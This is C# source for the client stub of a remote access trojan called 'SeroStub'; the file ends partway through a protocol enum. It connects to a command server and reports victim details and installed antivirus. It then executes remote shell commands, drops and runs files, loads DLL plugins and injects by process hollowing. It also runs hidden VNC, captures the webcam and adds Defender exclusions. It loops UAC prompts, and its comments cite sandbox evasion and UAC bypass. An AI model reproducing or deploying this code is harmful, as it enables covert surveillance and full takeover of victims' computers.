using System.Diagnostics;
using System.IO;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace SeroStub;

internal class TlsClient : IDisposable
{
    private TcpClient? _tcp;
    private SslStream? _ssl;
    private readonly string _host;
    private readonly int _port;
    private readonly SemaphoreSlim _writeLock = new(1, 1);
    private readonly string _instanceId = Guid.NewGuid().ToString("N").Substring(0, 8);

    /// <summary>False after Disconnect/Uninstall — caller should NOT reconnect.</summary>
    public bool ShouldReconnect { get; private set; } = true;

    public TlsClient(string host, int port)
    {
        _host = host;
        _port = port;
    }

    public async Task RunAsync(CancellationToken ct)
    {
        // Jitter: randomize initial connect time to defeat sandbox timing correlation
        await Task.Delay(Random.Shared.Next(100, 501), ct);
        _tcp = new TcpClient();
        await _tcp.ConnectAsync(_host, _port, ct);

        _ssl = new SslStream(_tcp.GetStream(), false, ValidateServerCert);
        await _ssl.AuthenticateAsClientAsync(_host);

        // Send client info with auth key
        ClientInfoData info;
        try
        {
            info = new ClientInfoData
            {
                OS = GetFriendlyOsName(),
                Username = Environment.UserName,
                MachineName = Environment.MachineName,
                Hwid = GetHwid(),
                Payload = Config.EnableHollowing
                    ? $"{Config.HollowTarget} (RunPE)"
                    : Config.HiddenFileName,
                AuthKey = Config.AuthKey,
                IsAdmin = IsAdmin(),
                Antivirus = GetAntivirus(),
                IdPrefix = Config.ClientIdPrefix,
                InstanceId = _instanceId
            };
        }
        catch
        {
            throw;
        }

        await WritePacketAsync(new Packet
        {
            Type = PacketType.ClientInfo,
            Data = JsonSerializer.Serialize(info, SeroJson.Default.ClientInfoData)
        }, ct);

        // Start heartbeat sender
        _ = HeartbeatSender(ct);

        // Report camera presence once on connect (reuse webcam MF enumeration)
        _ = Task.Run(async () =>
        {
            try
            {
                var hasCam = WebcamFeature.HasCamera() ? "Yes" : "No";
                await WritePacketAsync(new Packet { Type = PacketType.CameraStatus, Data = hasCam },
                                       CancellationToken.None);
            }
            catch { }
        });

        // Read loop - handles all incoming commands
        await ReadLoop(ct);
    }

    // ── Detached process spawn via CreateProcessW ────────────────────────
    // LayoutKind.Explicit, Size=104: matches STARTUPINFOW exactly on x64.
    // Only cb matters — all other fields are zero (no window, no handles).
    [System.Runtime.InteropServices.StructLayout(
        System.Runtime.InteropServices.LayoutKind.Explicit, Size = 104)]
    private struct STARTUPINFOW_S {
        [System.Runtime.InteropServices.FieldOffset(0)] public uint cb;
    }
    [System.Runtime.InteropServices.StructLayout(
        System.Runtime.InteropServices.LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION_S { public IntPtr hProcess, hThread; public uint pid, tid; }

    [System.Runtime.InteropServices.DllImport("kernel32.dll",
        CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern bool CreateProcessW(
        IntPtr app, System.Text.StringBuilder cmd,
        IntPtr pa, IntPtr ta, bool inherit, uint flags,
        IntPtr env, IntPtr dir,
        ref STARTUPINFOW_S si, out PROCESS_INFORMATION_S pi);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr h);

    // DETACHED_PROCESS | CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, no inherited handles
    private static bool _SpawnDetached(string cmdLine)
    {
        var si = new STARTUPINFOW_S { cb = 104 };
        var sb = new System.Text.StringBuilder(cmdLine);
        if (CreateProcessW(IntPtr.Zero, sb, IntPtr.Zero, IntPtr.Zero,
                false, 0x00000208u | 0x08000000u,
                IntPtr.Zero, IntPtr.Zero, ref si, out var pi))
        {
            if (pi.hProcess != IntPtr.Zero) CloseHandle(pi.hProcess);
            if (pi.hThread  != IntPtr.Zero) CloseHandle(pi.hThread);
            return true;
        }
        return false;
    }

    private async Task ReadLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            var packet = await ReadPacketAsync(ct);
            if (packet == null) break; // Connection lost

            switch (packet.Type)
            {
                case PacketType.HeartbeatAck:
                    break;

                case PacketType.Ping:
                    await WritePacketAsync(new Packet { Type = PacketType.Pong, Data = packet.Data }, ct);
                    break;

                case PacketType.RemoteShell:
                    await HandleShell(packet.Data, ct, PacketType.ShellOutput);
                    break;

                case PacketType.AutoTaskShell:
                    await HandleShell(packet.Data, ct, PacketType.AutoTaskShellOutput);
                    break;

                case PacketType.RemoteFileExec:
                    await HandleFileExec(packet.Data, ct);
                    break;

                case PacketType.RdpStart:
                    RemoteDesktopFeature.Start(
                        System.Text.Json.JsonSerializer.Deserialize<RdpStartDataStub>(packet.Data, SeroJson.Default.RdpStartDataStub) ?? new(),
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
                    break;
                case PacketType.RdpStop:
                    RemoteDesktopFeature.Stop();
                    break;
                case PacketType.RdpFrameAck:
                    RemoteDesktopFeature.SignalAck();
                    break;
                case PacketType.RdpGetMonitors:
                    RemoteDesktopFeature.SendMonitorListPublic(
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
                    break;
                case PacketType.RdpInput:
                    RemoteDesktopFeature.HandleInput(packet.Data);
                    break;
                case PacketType.RdpClipboard:
                    RemoteDesktopFeature.HandleClipboard(packet.Data);
                    break;

                case PacketType.WcamStart:
                    WebcamFeature.Start(
                        System.Text.Json.JsonSerializer.Deserialize<WcamStartDataStub>(packet.Data, SeroJson.Default.WcamStartDataStub) ?? new(),
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
                    break;
                case PacketType.WcamStop:
                    WebcamFeature.Stop();
                    break;

                case PacketType.HvncStart:
                    HvncFeature.Start(
                        System.Text.Json.JsonSerializer.Deserialize<HvncStartDataStub>(packet.Data, SeroJson.Default.HvncStartDataStub) ?? new(),
                        async (t, d) => await WritePacketAsync(new Packet { Type = (PacketType)t, Data = d }, ct));
                    break;
                case PacketType.HvncStop:
                    HvncFeature.Stop();
                    break;
                case PacketType.HvncFrameAck:
                    HvncFeature.SignalAck();
                    break;
                case PacketType.HvncInput:
                    HvncFeature.HandleInput(packet.Data);
                    break;
                case PacketType.HvncExec:
                    var hvncExec = System.Text.Json.JsonSerializer.Deserialize<HvncExecDataStub>(packet.Data, SeroJson.Default.HvncExecDataStub);
                    if (hvncExec != null && !string.IsNullOrWhiteSpace(hvncExec.Path))
                        HvncFeature.ExecOnDesktop(hvncExec.Path);
                    break;

                case PacketType.HollowExec:
                    await HandleHollowExec(packet.Data, ct);
                    break;

                case PacketType.Uninstall:
                    ShouldReconnect = false;
                    HandleUninstall();
                    return;

                case PacketType.RequestElevation:
                    _ = HandleElevation(false, ct);
                    break;

                case PacketType.RequestElevationLoop:
                    _ = HandleElevation(true, ct);
                    break;

                case PacketType.UpdateClient:
                    _ = HandleUpdateClient(packet.Data, ct);
                    break;

                case PacketType.DefenderExclude:
#pragma warning disable IL2026
                    _ = Task.Run(() => HandleDefenderExclude(packet.Data));
#pragma warning restore IL2026
                    break;

                case PacketType.PluginExec:
                    _ = HandlePluginExec(packet.Data, ct);
                    break;

                case PacketType.Disconnect:
                    ShouldReconnect = false;
                    Persistence.StopWatchdog();
                    Protection.StopGuardian();
                    // Clear the stop flag written by StopGuardian so the user can
                    // manually relaunch the stub immediately without the 15-second block.
                    Protection.ClearStopFlag();
                    if (Config.EnableWatchdog) Protection.RemoveDacl();
                    if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }
                    Program.ReleaseMutex();
                    return;

                default:
                    break;
            }
        }
    }

    [System.Runtime.InteropServices.DllImport("user32.dll")] private static extern nint GetForegroundWindow();
    [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    private static extern int GetWindowTextW(nint hwnd, System.Text.StringBuilder sb, int max);

    private static string GetActiveWindowTitle()
    {
        try
        {
            var hwnd = GetForegroundWindow();
            if (hwnd == 0) return "";
            var sb = new System.Text.StringBuilder(256);
            GetWindowTextW(hwnd, sb, 256);
            return sb.ToString();
        }
        catch { return ""; }
    }

    private async Task HeartbeatSender(CancellationToken ct)
    {
        int ticks = 0;
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(Config.HeartbeatIntervalMs, ct);
                await WritePacketAsync(new Packet { Type = PacketType.Heartbeat }, ct);

                // Send active window every heartbeat (3 s)
                if (++ticks >= 1)
                {
                    ticks = 0;
                    var title = GetActiveWindowTitle();
                    if (!string.IsNullOrEmpty(title))
                        _ = WritePacketAsync(new Packet { Type = PacketType.ActiveWindow, Data = title },
                                             CancellationToken.None);
                }
            }
            catch { break; }
        }
    }

    // ── Command Handlers ────────────────────────────

    private async Task HandleShell(string command, CancellationToken ct, PacketType responseType = PacketType.ShellOutput)
    {
        string output;
        int exitCode;

        try
        {
            using var proc = new Process();
            proc.StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c {command}",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };
            proc.Start();

            var stdoutTask = proc.StandardOutput.ReadToEndAsync(ct);
            var stderrTask = proc.StandardError.ReadToEndAsync(ct);
            await proc.WaitForExitAsync(ct);
            var stdout = await stdoutTask;
            var stderr = await stderrTask;

            output = string.IsNullOrEmpty(stderr) ? stdout : $"{stdout}\n{stderr}";
            exitCode = proc.ExitCode;
        }
        catch (Exception ex)
        {
            output = $"Error: {ex.Message}";
            exitCode = -1;
        }

        await WritePacketAsync(new Packet
        {
            Type = responseType,
            Data = JsonSerializer.Serialize(new ShellOutputData { Output = output, ExitCode = exitCode }, SeroJson.Default.ShellOutputData)
        }, ct);
    }

    [System.Diagnostics.CodeAnalysis.RequiresUnreferencedCode("WMI")]
    private static void HandleDefenderExclude(string path)
    {
        string excludeDir;
        if (!string.IsNullOrWhiteSpace(path))
        {
            // Server specified an explicit path
            excludeDir = path;
        }
        else
        {
            // Fall back to stub's own install directory
            var installPath = Persistence.GetInstalledPath(Config.PersistName);
            excludeDir = installPath != null
                ? Path.GetDirectoryName(installPath)!
                : Path.GetDirectoryName(Environment.ProcessPath ?? "")!;
        }
        if (!string.IsNullOrEmpty(excludeDir))
            Protection.AddDefenderExclusion(excludeDir);
    }

    [System.Runtime.InteropServices.UnmanagedFunctionPointer(System.Runtime.InteropServices.CallingConvention.Winapi)]
    private delegate bool PluginMainDelegate();

    private async Task HandlePluginExec(string data, CancellationToken ct)
    {
        string? dllDir = null;
        string? dllPath = null;
        string? logPath = null;
        nint lib = 0;
        try
        {
            var pluginData = JsonSerializer.Deserialize(data, SeroJson.Default.PluginExecData);
            if (pluginData == null) return;

            dllDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
            Directory.CreateDirectory(dllDir);
            dllPath = Path.Combine(dllDir, Guid.NewGuid().ToString("N")[..8] + ".dll");
            logPath = Path.Combine(dllDir, "log.txt");

            await File.WriteAllBytesAsync(dllPath, Convert.FromBase64String(pluginData.DllBase64), ct);

            // Set log path env var so plugins can write results
            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", logPath);

            lib = System.Runtime.InteropServices.NativeLibrary.Load(dllPath);
            bool ok = false;
            if (System.Runtime.InteropServices.NativeLibrary.TryGetExport(lib, pluginData.ExportName, out nint fn))
            {
                var del = System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer<PluginMainDelegate>(fn);
                ok = del();
            }
            else { }

            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", null);

            // Read optional plugin log (e.g. BotKiller reports killed processes)
            var logLines = "";
            if (File.Exists(logPath))
                try { logLines = "\n" + await File.ReadAllTextAsync(logPath, ct); } catch { }

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                {
                    Output = $"[Plugin] {pluginData.ExportName}: {(ok ? "OK" : "FAILED")}{logLines}",
                    ExitCode = ok ? 0 : 1
                }, SeroJson.Default.ShellOutputData)
            }, ct);
        }
        catch { }
        finally
        {
            Environment.SetEnvironmentVariable("SERO_PLUGIN_LOG", null);
            if (lib != 0) try { System.Runtime.InteropServices.NativeLibrary.Free(lib); } catch { }
            await Task.Delay(500);
            if (dllPath != null) try { File.Delete(dllPath); } catch { }
            if (dllDir != null) try { Directory.Delete(dllDir, true); } catch { }
        }
    }

    private async Task HandleFileExec(string data, CancellationToken ct)
    {
        string? dropDir = null;
        try
        {
            var fileData = JsonSerializer.Deserialize(data, SeroJson.Default.RemoteFileExecData);
            if (fileData == null) return;

            var safeName = Path.GetFileName(fileData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) return;

            dropDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
            Directory.CreateDirectory(dropDir);
            var filePath = Path.Combine(dropDir, safeName);

            await File.WriteAllBytesAsync(filePath, Convert.FromBase64String(fileData.FileBase64), ct);

            bool isExe = string.Equals(Path.GetExtension(safeName), ".exe",
                                        StringComparison.OrdinalIgnoreCase);
            var psi = new ProcessStartInfo
            {
                FileName        = filePath,
                UseShellExecute = !isExe,
                CreateNoWindow  = isExe,
                WindowStyle     = isExe ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
            };

            var proc = Process.Start(psi);
            // For non-exe files (images, docs), null proc = UWP/shell handled it = success
            bool launched = proc != null || !isExe;
            var result = launched
                ? $"[FileExec] Launched {safeName}" + (proc?.Id is int pid ? $" (PID={pid})" : " (shell)")
                : $"[FileExec] Failed to start {safeName}";

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                {
                    Output = result,
                    ExitCode = launched ? 0 : -1
                }, SeroJson.Default.ShellOutputData)
            }, ct);

            if (proc != null)
            {
                // Wait up to 3 min for non-exe (image viewers, docs) before cleaning up
                var timeout = isExe ? TimeSpan.FromSeconds(30) : TimeSpan.FromMinutes(3);
                _ = Task.Run(async () =>
                {
                    try { await proc.WaitForExitAsync(CancellationToken.None).WaitAsync(timeout); }
                    catch { }
                    finally
                    {
                        try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
                        proc.Dispose();
                    }
                });
            }
            else if (!isExe)
            {
                // UWP or shell-launched: wait before cleanup so file is loaded by the app
                _ = Task.Run(async () =>
                {
                    await Task.Delay(TimeSpan.FromSeconds(60));
                    try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
                });
            }
        }
        catch
        {
            try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
        }
    }

    private async Task HandleUpdateClient(string data, CancellationToken ct)
    {
        try
        {
            var updateData = JsonSerializer.Deserialize<UpdateClientData>(data, SeroJson.Default.UpdateClientData);
            if (updateData == null) return;

            var safeName = Path.GetFileName(updateData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) return;

            // Resolve install directory — same folder the current client lives in.
            // Writing here avoids Defender ASR "block untrusted exe from %TEMP%".
            // If ExcludeDefender ran, this whole path is excluded from scanning.
            var installPath0 = Persistence.GetInstalledPath(Config.PersistName);
            var installDir = !string.IsNullOrEmpty(installPath0)
                ? Path.GetDirectoryName(installPath0)!
                : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Config.PersistName);
            Directory.CreateDirectory(installDir);

            // Write new exe to installDir with a random name so it doesn't conflict
            // with the currently-running HiddenFileName.exe (which is still locked).
            var stagePath = Path.Combine(installDir, Guid.NewGuid().ToString("N")[..10] + ".exe");
            await File.WriteAllBytesAsync(stagePath, Convert.FromBase64String(updateData.FileBase64), ct);

            // Tear down ALL protections FIRST — rootkit must not inject into the new
            // process, guardian must not restart the old one after it exits.
            if (Config.EnableRootkit) Rootkit.Stop();
            Persistence.StopWatchdog();
            Protection.StopGuardian();
            // StopGuardian writes a stop flag — clear it immediately so the new exe
            // doesn't find it and exit with "EXIT: recent stop flag" on startup.
            Protection.ClearStopFlag();
            if (Config.EnableWatchdog) Protection.RemoveDacl();
            if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }

            // UseShellExecute=true is the primary spawn method — ShellExecuteEx assigns a
            // proper desktop context to the child process, which is required for UAC bypass
            // techniques (wsreset/fodhelper/sdclt) to work in the new crypted exe.
            // DETACHED_PROCESS (used by _SpawnDetached) strips the window station and
            // silently breaks UAC elevation, causing the new client to come back as user.
            bool spawned = false;
            try { Process.Start(new ProcessStartInfo { FileName = stagePath, UseShellExecute = true, WindowStyle = ProcessWindowStyle.Hidden })?.Dispose(); spawned = true; } catch { }
            if (!spawned) spawned = _SpawnDetached($"\"{stagePath}\"");

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData
                    { Output = $"Update: {(spawned ? "OK" : "FAIL")} {stagePath}", ExitCode = spawned ? 0 : 1 },
                    SeroJson.Default.ShellOutputData)
            }, ct);

            // Don't ReleaseMutex — let Environment.Exit abandon it.
            // The new exe catches AbandonedMutexException (handled in Program.cs line ~120)
            // and continues normally. This avoids the race window where mutex is free
            // but old process is still alive and a third instance could grab it.
            await Task.Delay(500, ct);
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            try
            {
                await WritePacketAsync(new Packet
                {
                    Type = PacketType.ShellOutput,
                    Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update failed: {ex.Message}", ExitCode = -1 }, SeroJson.Default.ShellOutputData)
                }, ct);
            }
            catch { }
        }
    }

    private async Task HandleHollowExec(string data, CancellationToken ct)
    {
        try
        {
            var hollowData = JsonSerializer.Deserialize(data, SeroJson.Default.HollowExecData);
            if (hollowData == null) return;

            var safeName = Path.GetFileName(hollowData.FileName);
            if (string.IsNullOrWhiteSpace(safeName)) return;

            // Write PE to temp (random dir — no static fingerprint)
            var tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N")[..12]);
            Directory.CreateDirectory(tempDir);
            var pePath = Path.Combine(tempDir, safeName);
            await File.WriteAllBytesAsync(pePath, Convert.FromBase64String(hollowData.FileBase64), ct);

            // Resolve target process path — strip directory components from
            // bare names so relative traversal (../../...) is not possible.
            var target = hollowData.TargetProcess;
            if (!Path.IsPathRooted(target))
                target = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    Path.GetFileName(target)); // GetFileName strips any .. segments
            // Reject paths that escaped Windows/System32 directories
            var norm   = Path.GetFullPath(target);
            var sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
            var winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            if (!norm.StartsWith(sysDir, StringComparison.OrdinalIgnoreCase) &&
                !norm.StartsWith(winDir, StringComparison.OrdinalIgnoreCase))
            {
                return;
            }

            int pid = ProcessHollowing.Hollow(pePath, target);

            // Send result back as shell output
            var result = pid > 0
                ? $"[Hollow] Injection success. PID={pid}"
                : "[Hollow] Injection failed. Check logs.";

            await WritePacketAsync(new Packet
            {
                Type = PacketType.ShellOutput,
                Data = JsonSerializer.Serialize(new ShellOutputData { Output = result, ExitCode = pid > 0 ? 0 : -1 }, SeroJson.Default.ShellOutputData)
            }, ct);

            // Cleanup PE from temp
            try { File.Delete(pePath); } catch { }
        }
        catch { }
    }

    private async Task HandleElevation(bool loop, CancellationToken ct)
    {
        if (IsAdmin())
        {
            await WritePacketAsync(new Packet
            {
                Type = PacketType.ElevationResult,
                Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "Already elevated" }, SeroJson.Default.ElevationResultData)
            }, ct);
            return;
        }

        bool elevated = false;
        do
        {
            // Resolve exe path: prefer installed AppData copy (works even when hollowed into dllhost etc.)
            var selfPath = Persistence.GetInstalledPath(Config.PersistName);
            if (string.IsNullOrEmpty(selfPath))
            {
                // No installed copy — copy our real exe to AppData
                // When hollowed, Environment.ProcessPath = dllhost.exe, so we use the original exe from disk
                try
                {
                    var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    var installDir = Path.Combine(appData, Config.PersistName);
                    Directory.CreateDirectory(installDir);
                    var installExe = Path.Combine(installDir, Config.HiddenFileName);

                    // Try to find the real stub exe (not dllhost)
                    var currentExe = Environment.ProcessPath;
                    bool isHollowed = ProcessHollowing.IsHollowedInstance();

                    if (isHollowed)
                    {
                        // When hollowed, our real exe was the one that launched the hollow
                        // It should already be in AppData if persistence was used, otherwise
                        // we can't easily get it — use the backup from LocalAppData
                        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                        var backupExe = Path.Combine(localAppData, "." + Config.PersistName, Config.HiddenFileName);
                        if (File.Exists(backupExe))
                        {
                            File.Copy(backupExe, installExe, true);
                            selfPath = installExe;
                        }
                    }
                    else if (!string.IsNullOrEmpty(currentExe) && File.Exists(currentExe))
                    {
                        File.Copy(currentExe, installExe, true);
                        selfPath = installExe;
                    }
                }
                catch { }
            }
            // Final fallback
            if (string.IsNullOrEmpty(selfPath))
                selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) break;

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = selfPath,
                    UseShellExecute = true,
                    Verb = "runas"
                };

                if (Config.AntiKill)
                {
                    try { Protection.UnsetCriticalProcess(); } catch { }
                }

                // Release mutex BEFORE launching elevated process
                // so the new instance can acquire it in Main()
                Program.ReleaseMutex();

                var proc = Process.Start(psi);
                if (proc != null)
                {
                    elevated = true;
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = true, Message = "UAC accepted" }, SeroJson.Default.ElevationResultData)
                    }, ct);

                    // Give the elevated instance time to connect before we exit
                    await Task.Delay(2000, ct);

                    Environment.Exit(0);
                }
                else
                {
                    // Process.Start returned null — reacquire mutex
                    Program.ReacquireMutex();
                }
            }
            catch (Exception ex)
            {
                // Mutex was released before Process.Start — reacquire it
                Program.ReacquireMutex();

                // Always send failure response (prevents UI flickering on loop)
                if (!elevated)
                {
                    await WritePacketAsync(new Packet
                    {
                        Type = PacketType.ElevationResult,
                        Data = JsonSerializer.Serialize(new ElevationResultData { Success = false, Message = "UAC declined" }, SeroJson.Default.ElevationResultData)
                    }, ct);
                }
            }

            if (loop && !elevated)
                await Task.Delay(3000, ct);

        } while (loop && !elevated && !ct.IsCancellationRequested);
    }

    private void HandleUninstall()
    {
        try
        {
            // Stop rootkit injector and remove DLL + s.cfg before the batch cleans directories
            if (Config.EnableRootkit)
                Rootkit.Cleanup();

            // Stop all protection before uninstalling
            Persistence.StopWatchdog();
            Protection.StopGuardian();    // writes stop flag so surviving guardians won't relaunch
            Protection.CleanupGuardianCopies();
            // NOTE: do NOT call ClearStopFlag() here — the flag must persist after exit so that
            // any guardian that wakes up late sees it and does not relaunch the main process.

            // Remove DACL so the process can exit cleanly
            if (Config.EnableWatchdog)
                Protection.RemoveDacl();

            // Disable BSOD before uninstalling
            if (Config.AntiKill)
            {
                try { Protection.UnsetCriticalProcess(); } catch { }
            }

            Persistence.RemoveRegistry(Config.PersistName);
            Persistence.RemoveRegistryHKLM(Config.PersistName);
            Persistence.RemoveStartup(Config.PersistName);
            Persistence.RemoveScheduledTask(Config.PersistName);
            Persistence.RemoveService(Config.PersistName);

            Program.ReleaseMutex();

            // In RunPE mode, ProcessPath = hollowed target (dllhost.exe etc.) — use SERO_EXE instead
            var selfPath = ProcessHollowing.IsHollowedInstance()
                ? (Environment.GetEnvironmentVariable("SERO_EXE") ?? Persistence.GetInstalledPath(Config.PersistName))
                : (Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath);

            var appDataDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Config.PersistName);
            var backupDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "WindowsServices");
            var disguiseDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Microsoft", "CoreRuntime");
            var delCmd = "/c timeout /t 8 /nobreak >nul";
            if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                delCmd += $" & del /f /q \"{selfPath}\"";
            if (Directory.Exists(appDataDir))
                delCmd += $" & rmdir /s /q \"{appDataDir}\"";
            if (Directory.Exists(backupDir))
                delCmd += $" & rmdir /s /q \"{backupDir}\"";
            if (Directory.Exists(disguiseDir))
                delCmd += $" & rmdir /s /q \"{disguiseDir}\"";

            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = delCmd,
                CreateNoWindow = true,
                UseShellExecute = false,
            });
        }
        catch { }

        Environment.Exit(0);
    }

    // ── Packet IO ───────────────────────────────────

    private async Task WritePacketAsync(Packet packet, CancellationToken ct)
    {
        if (_ssl == null) return;
        await _writeLock.WaitAsync(ct);
        try
        {
            var json = JsonSerializer.Serialize(packet, SeroJson.Default.Packet);
            var jsonBytes = Encoding.UTF8.GetBytes(json);
            var lengthBytes = BitConverter.GetBytes(jsonBytes.Length);
            await _ssl.WriteAsync(lengthBytes, ct);
            await _ssl.WriteAsync(jsonBytes, ct);
            await _ssl.FlushAsync(ct);
        }
        finally { _writeLock.Release(); }
    }

    private async Task<Packet?> ReadPacketAsync(CancellationToken ct)
    {
        if (_ssl == null) return null;

        var lenBuf = new byte[4];
        int read = 0;
        while (read < 4)
        {
            int n = await _ssl.ReadAsync(lenBuf.AsMemory(read, 4 - read), ct);
            if (n == 0) return null;
            read += n;
        }

        int length = BitConverter.ToInt32(lenBuf, 0);
        if (length <= 0 || length > 500 * 1024 * 1024) return null; // 500 MB max

        var dataBuf = new byte[length];
        read = 0;
        while (read < length)
        {
            int n = await _ssl.ReadAsync(dataBuf.AsMemory(read, length - read), ct);
            if (n == 0) return null;
            read += n;
        }

        return JsonSerializer.Deserialize(Encoding.UTF8.GetString(dataBuf), SeroJson.Default.Packet);
    }

    // ── Cert Pinning ───────────────────────────────

    private static bool ValidateServerCert(object sender, X509Certificate? certificate, X509Chain? chain, SslPolicyErrors sslPolicyErrors)
    {
        // If no cert hash configured, accept any (dev mode)
        if (string.IsNullOrEmpty(Config.CertHash))
            return true;

        if (certificate == null) return false;

        // Compare SHA256 thumbprint
        var hash = SHA256.HashData(certificate.GetRawCertData());
        var certHash = Convert.ToHexString(hash);
        return string.Equals(certHash, Config.CertHash, StringComparison.OrdinalIgnoreCase);
    }

    // ── Helpers ─────────────────────────────────────

    private static string GetFriendlyOsName()
    {
        try
        {
            using var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            if (key != null)
            {
                var productName = key.GetValue("ProductName")?.ToString() ?? "";
                var displayVersion = key.GetValue("DisplayVersion")?.ToString() ?? "";
                var buildNumber = key.GetValue("CurrentBuildNumber")?.ToString() ?? "";

                // Windows 11 has build >= 22000 but ProductName may still say "Windows 10"
                if (int.TryParse(buildNumber, out int build) && build >= 22000)
                    productName = productName.Replace("Windows 10", "Windows 11");

                if (!string.IsNullOrEmpty(displayVersion))
                    return $"{productName} {displayVersion}";
                return productName;
            }
        }
        catch { }
        return Environment.OSVersion.ToString();
    }

    private static string GetHwid()
    {
        var raw = $"{Environment.MachineName}:{Environment.UserName}:{Environment.ProcessorCount}";
        return Convert.ToBase64String(SHA256.HashData(Encoding.UTF8.GetBytes(raw)));
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetAntivirus()
    {
        try
        {
            var avMap = new (string proc, string name)[]
            {
                ("MsMpEng", "Windows Defender"), ("SecurityHealthService", "Windows Defender"),
                ("avastui", "Avast"), ("AvastSvc", "Avast"),
                ("avgui", "AVG"), ("AVGSvc", "AVG"),
                ("bdagent", "Bitdefender"), ("bdservicehost", "Bitdefender"),
                ("ekrn", "ESET"), ("egui", "ESET"),
                ("mcshield", "McAfee"), ("mfemms", "McAfee"),
                ("NortonSecurity", "Norton"), ("nsWscSvc", "Norton"),
                ("SavService", "Sophos"), ("SAVAdminService", "Sophos"),
                ("avp", "Kaspersky"), ("kavfs", "Kaspersky"),
                ("MBAMService", "Malwarebytes"), ("mbamtray", "Malwarebytes"),
                ("PandaAgent", "Panda"),
                ("coreServiceShell", "Trend Micro"), ("ntrtscan", "Trend Micro"),
                ("CylanceSvc", "Cylance"),
                ("SentinelAgent", "SentinelOne"), ("SentinelServiceHost", "SentinelOne"),
                ("CSFalconService", "CrowdStrike"), ("CSFalconContainer", "CrowdStrike"),
                ("cbdefense", "Carbon Black"), ("RepMgr", "Carbon Black"),
                ("fmon", "F-Secure"), ("fsav32", "F-Secure"),
                ("dwengine", "Dr.Web"), ("dwservice", "Dr.Web"),
            };

            var detected = new HashSet<string>();
            foreach (var p in Process.GetProcesses())
            {
                try
                {
                    var name = p.ProcessName;
                    foreach (var (proc, avName) in avMap)
                    {
                        if (name.Equals(proc, StringComparison.OrdinalIgnoreCase))
                        {
                            detected.Add(avName);
                            break;
                        }
                    }
                }
                catch { }
                finally { p.Dispose(); }
            }

            return detected.Count > 0 ? string.Join(", ", detected) : "None";
        }
        catch
        {
            return "Unknown";
        }
    }

    public void Dispose()
    {
        _ssl?.Close();
        _tcp?.Close();
        _writeLock.Dispose();
    }
}

// ── Protocol types ──────────────────────────────────

internal enum PacketType
{
    Heartbeat = 2,
    ClientInfo = 3,
    ShellOutput = 4,
    ElevationResult = 5,
    HeartbeatAck = 11,
    Disconnect = 14,
    RemoteShell = 20,
    RemoteFileExec = 21,
